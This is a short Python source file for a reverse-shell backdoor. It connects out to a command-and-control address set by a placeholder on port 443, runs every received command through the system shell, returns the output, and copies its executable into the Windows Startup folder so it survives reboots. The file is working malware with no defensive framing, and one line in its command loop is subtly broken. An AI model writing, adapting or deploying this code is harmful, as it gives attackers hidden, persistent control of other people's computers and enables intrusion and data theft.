import socket
import subprocess
import threading
import time
import os

CCIP = "<YOUR_CCHOST_IP_ADDRESS>"
CCPORT = 443


def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    # print(exe_file)
    os.system("copy {} AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(exe_file))

def conn(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as e:
        print(e)

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as e:
        print(e)

def cli(client):
    while True:
        try:
            data = client.recv(1024)
            data = data.decode("utf-8")
            data_result = cmd(client, data)
            client.send(data_result).encode("utf-8")
        except Exception as e:
            print(e)


if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)
        else:
            time.sleep(3)



